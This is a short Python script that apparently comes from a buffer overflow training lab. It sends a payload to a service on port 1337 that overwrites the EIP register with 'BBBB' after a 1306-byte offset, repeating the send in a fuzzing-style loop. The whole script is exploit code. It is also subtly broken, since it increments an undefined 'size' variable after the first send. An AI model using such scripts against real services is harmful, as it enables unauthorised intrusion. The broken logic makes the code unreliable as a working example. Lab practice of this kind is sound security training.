#!/usr/bin/python3

import socket, time, sys

remoteip="10.10.100.198"
remoteport=1337
prefix = "OVERFLOW7 "
offset= "A" * 1306
eip= "BBBB"
esp = "C" * 100
buffer = prefix + offset + eip + esp

while True:

    print ("Fuzzing with %s bytes" % len(buffer))
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    print (s.recv(1024))
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print (s.recv(1024))
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print ("-------------------------")
